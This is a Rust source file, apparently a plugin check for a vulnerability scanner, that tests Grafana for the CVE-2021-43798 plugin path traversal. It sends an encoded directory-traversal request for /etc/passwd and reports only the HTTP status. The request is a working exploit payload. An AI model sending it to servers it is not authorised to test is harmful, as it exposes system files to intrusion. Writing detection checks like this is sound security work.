/* grafana-check-cve2021-43798-4 - Grafana plugin path traversal (CVE-2021-43798) */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if !valid(ctx) {
        return 1;
    }
    let resp = match http_request(ctx, "GET", "/public/plugins/graph/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", None, "", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => {
            let port = unsafe { (*ctx).port };
            set_out(ctx, &format!("grafana-check-cve2021-43798-4: no HTTP response on port {}", port));
            return 0;
        }
    };
    let code = http_status(&resp);
    let suffix = if code == 200 { " (open; verify)" } else { "" };
    set_out(
        ctx,
        &format!("grafana-check-cve2021-43798-4: GET /public/plugins/graph/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd [{}]{}", code, suffix),
    );
    0
}
